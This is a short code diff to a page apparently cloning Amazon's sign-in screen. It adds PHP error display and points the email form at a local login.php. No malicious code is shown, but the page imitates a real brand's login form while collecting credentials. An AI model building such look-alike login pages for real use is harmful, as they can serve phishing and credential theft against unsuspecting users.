@@ -1,3 +1,17 @@
+<?php
+require_once('functions.php');
+$pageTitle = "Amazon Login";
+
+if (isset($errors) && !empty($errors)) {
+	echo '<h1>Error!</h1>
+	<p class="error">The following error(s) occurred:<br />';
+	foreach ($errors as $msg) {
+		echo " - $msg<br />\n";
+	}
+	echo '</p><p>Please try again.</p>';
+}
+?>
+
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
     <head>
@@ -39,7 +53,7 @@
                     </div>
 
                     <div class="login-form">
-                        <form>
+                        <form action="login.php" method="post">
                             <br />
                             Email (phone for mobile accounts)<br />
                             <input type="email" name="email" style="width: 100%;" /><br /><br />
